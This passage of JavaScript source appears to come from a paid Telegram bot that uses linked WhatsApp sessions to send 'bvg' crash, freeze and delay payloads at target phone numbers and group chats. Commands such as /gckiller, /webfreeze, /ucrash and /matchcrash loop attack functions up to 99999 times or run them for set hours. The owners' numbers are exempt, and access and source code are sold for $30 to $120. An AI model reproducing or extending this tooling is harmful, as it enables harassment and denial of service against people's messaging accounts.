  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ sent bvg...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await Promise.all([
      xeonPendingMakerExecutor2(durationHours, formattedNumber, userNumber, chatId, botInstance)
    ]);
  } catch (error) {
    console.error(`Error in /pendingv2 for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /pendingv2: ${error.message}`);
  }
});

botInstance.onText(/\/u392ksksksk(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /pendingmix raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /pendingmix input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /pendingmix: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /pendingmix +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /pendingmix: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /pendingmix +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /pendingmix: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /pendingmix: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /pendingmix: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /pendingmix: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ sent bvg...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await Promise.all([
      xeonPendingMakerMix(durationHours, formattedNumber, userNumber, chatId, botInstance)
    ]);
  } catch (error) {
    console.error(`Error in /pendingmix for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /pendingmix: ${error.message}`);
  }
});

botInstance.onText(/\/je9w82jd(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /gckiller raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /gckiller input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /gckiller: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a group JID.\nExample: /gckiller 120363047626537xxx@g.us\n\nTo get group ID, use /listgc or /group-id <link>');
  }

  const rawTarget = match[2].trim();
  console.log(`[DEBUG] /gckiller: rawTarget = "${rawTarget}"`);

  if (rawTarget.includes('chat.whatsapp.com')) {
    console.log(`[DEBUG] /gckiller: Input is a group link, sending error message`);
    return userBot.sendMessage(chatId, '❌ Group ID must be a JID (e.g., 120363047626537xxx@g.us). Use /group-id <link> to get the group ID.');
  }

  if (!rawTarget.endsWith('@g.us')) {
    console.log(`[DEBUG] /gckiller: Invalid group JID format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid group JID. It must end with @g.us. Example: 120363047626537xxx@g.us');
  }

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent bvg to group...
│➻ Target: ${rawTarget.replace('@g.us', '')}
│➻ From: ${userNumber}
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    for (let i = 0; i < 30; i++) {
        await xeonGroupCrashInfinity(rawTarget, userNumber, chatId, botInstance);
    }
  } catch (error) {
    console.error(`Error in /gckiller for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /gckiller: ${error.message}`);
  }
});

botInstance.onText(/\/webfreeze(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /webfreeze raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }
  
  if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /webfreeze input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /webfreeze: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number.\nExample: /webfreeze +919876543210');
  }

  const rawTarget = match[2].trim();
  console.log(`[DEBUG] /webfreeze: rawTarget = "${rawTarget}"`);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /webfreeze: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /webfreeze: numberTarget = "${numberTarget}"`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /webfreeze: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
  await sendTelegramGreetingLog('/webfreeze', senderId, numberTarget, true);
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent bvg to 👇🏻
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
└────────────────────────┘`,
parse_mode: 'HTML'
    });
        for (let i = 0; i < 99999; i++) {
          await xeonStickerWebWaKiller(formattedNumber, userNumber, chatId, botInstance, true);
        }
  } catch (error) {
  await sendTelegramGreetingLog('/webfreeze', senderId, numberTarget, false);
    console.error(`Error in /webfreeze for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /webfreeze: ${error.message}`);
  }
});

botInstance.onText(/\/xstress(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /xstress raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /xstress input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /xstress: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /xstress +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /xstress: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /xstress +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /xstress: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /xstress: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /xstress: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /xstress: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
  await sendTelegramGreetingLog('/xstress', senderId, numberTarget, true);
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ sent bvg...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await Promise.all([
      xeonRichBlokDelayExecutor(durationHours, formattedNumber, userNumber, chatId, botInstance)
    ]);
  } catch (error) {
  await sendTelegramGreetingLog('/xstress', senderId, numberTarget, false);
    console.error(`Error in /xstress for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /xstress: ${error.message}`);
  }
});

botInstance.onText(/\/ucrashgc(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /ucrashgc raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /ucrashgc input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /ucrashgc: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a group JID and duration.\nExample: /ucrashgc 120363047626537xxx@g.us 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /ucrashgc: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a group JID and duration in hours.\nExample: /ucrashgc 120363047626537xxx@g.us 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!rawTarget.endsWith('@g.us')) {
    console.log(`[DEBUG] /ucrashgc: Invalid group JID format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid group JID. It must end with @g.us. Example: 120363047626537xxx@g.us');
  }

  if (rawTarget.includes('chat.whatsapp.com')) {
    console.log(`[DEBUG] /ucrashgc: Input is a group link, sending error message`);
    return userBot.sendMessage(chatId, '❌ Group ID must be a JID (e.g., 120363047626537xxx@g.us). Use /group-id <link> to get the group ID.');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /ucrashgc: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  try {
  await sendTelegramGreetingLog('/richxiosv2', senderId, rawTarget, true);
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ sent bvg to👇🏻
│➻ Target: ${rawTarget.replace('@g.us', '')}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

      await xeonDelayStupidGcExecutor(durationHours, rawTarget, userNumber, chatId, botInstance);

  } catch (error) {
  await sendTelegramGreetingLog('/richxiosv2', senderId, rawTarget, false);
    console.error(`Error in /ucrashgc for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /ucrashgc: ${error.message}`);
  }
});

botInstance.onText(/\/xdxdokwisj(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /ucrashv2 raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /ucrashv2 input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /ucrashv2: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /ucrashv2 +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /ucrashv2: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /ucrashv2 +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /ucrashv2: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /ucrashv2: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /ucrashv2: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /ucrashv2: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
  await sendTelegramGreetingLog('/ucrashv2', senderId, numberTarget, true);
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ sent bvg...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await Promise.all([
      xeonDelayStupidExecutor(durationHours, formattedNumber, userNumber, chatId, botInstance)
    ]);
  } catch (error) {
  await sendTelegramGreetingLog('/ucrashv2', senderId, numberTarget, false);
    console.error(`Error in /ucrashv2 for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /ucrashv2: ${error.message}`);
  }
});

botInstance.onText(/\/82jexkskkw(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /ucrash raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /ucrash input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /ucrash: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /ucrash +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /ucrash: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /ucrash +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /ucrash: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /ucrash: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /ucrash: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /ucrash: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
  await sendTelegramGreetingLog('/ucrash', senderId, numberTarget, true);
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ sent bvg...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await Promise.all([
      xeonUnifiedXstickerReactionExecutor(durationHours, formattedNumber, userNumber, chatId, botInstance)
    ]);
  } catch (error) {
  await sendTelegramGreetingLog('/ucrash', senderId, numberTarget, false);
    console.error(`Error in /ucrash for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /ucrash: ${error.message}`);
  }
});

botInstance.onText(/\/matchcrash(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /matchcrash raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /matchcrash input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /matchcrash: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /matchcrash +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /matchcrash: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /matchcrash +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /matchcrash: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /matchcrash: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /matchcrash: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /matchcrash: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
  await sendTelegramGreetingLog('/matchcrash', senderId, numberTarget, true);
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ sent bvg...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await Promise.all([
      xeonCrashXFreezeExecutor(durationHours, formattedNumber, userNumber, chatId, botInstance)
    ]);
  } catch (error) {
  await sendTelegramGreetingLog('/matchcrash', senderId, numberTarget, false);
    console.error(`Error in /matchcrash for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /matchcrash: ${error.message}`);
  }
});

botInstance.onText(/\/androidgc(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /androidgc raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /androidgc input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /androidgc: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a group JID and duration.\nExample: /androidgc 120363047626537xxx@g.us 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /androidgc: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a group JID and duration in hours.\nExample: /androidgc 120363047626537xxx@g.us 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!rawTarget.endsWith('@g.us')) {
